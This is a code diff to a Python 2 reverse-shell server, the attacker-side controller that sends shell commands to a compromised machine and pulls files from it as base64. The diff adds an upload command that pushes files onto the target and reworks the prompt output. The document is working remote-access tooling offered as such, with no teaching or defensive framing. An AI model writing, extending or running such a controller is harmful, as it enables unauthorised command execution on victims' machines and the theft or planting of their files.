@@ -2,6 +2,7 @@
 import socket
 import json
 import base64
+import time
 
 class reverse_shell_server:
     target     = None
@@ -36,14 +37,17 @@ class reverse_shell_server:
         print "target = ",self.target, "ip = ",self.target_ip
         
         while True:
+            prompt  ="reverse_shell:@{}~# ".format(self.target_ip)
             command = raw_input("reverse_shell:@{}~# ".format(self.target_ip))
             #self.reliable_send(command)
             if command == "q" or command == "quit" or command == "exit":
                 self.reliable_send(command)
                 break
+
             elif len(command)>0 and command[:2] == "cd":
                 self.reliable_send(command)
-                print self.reliable_recv()
+                print prompt+self.reliable_recv()
+
             elif len(command)>=8 and command[:8] == "download":
                 file_list = command.split(" ")
                 if len(file_list)>1:
@@ -53,13 +57,36 @@ class reverse_shell_server:
                             with open(file_name, "wb") as downloaded_file:
                                 downloaded_file.write(base64.b64decode(self.reliable_recv()))
                         else:
-                            print "error: no file name mentioned"
+                            print prompt+"error: no file name mentioned"
                 else:
-                    print "error: no file name mentioned"
+                    print prompt+"error: no file name mentioned"
+            elif len(command)>=6 and command[:6] == "upload":
+                file_list = command.split(" ")
+                if len(file_list)>1:
+                    for file_name in file_list[1:]:
+                        if not len(file_name) == 0:
+                            self.reliable_send("upload "+file_name)
+                            time.sleep(2)
+                            try:
+                                with open(file_name, "rb") as upload_file:
+                                    self.reliable_send(base64.b64encode(upload_file.read()))
+                                    time.sleep(1)
+                                    print prompt+"uploading "+file_name+"..."
+                                    time.sleep(1)
+                                    print prompt+file_name+" uploaded sucessfully!"
+                                time.sleep(1)
+                            except:
+                                print prompt+"error: failed to upload "+file_name
+                                self.reliable_send("failed")
+                                time.sleep(2)
+                        else:
+                            print prompt+"error: no file name mentioned"
+                else:
+                    print prompt+"error: no file name mentioned"
             else:
                 self.reliable_send(command)
                 output = self.reliable_recv()
-                print output
+                print prompt+output
     def close_conn(self):
         self.server_sock.close()
                 
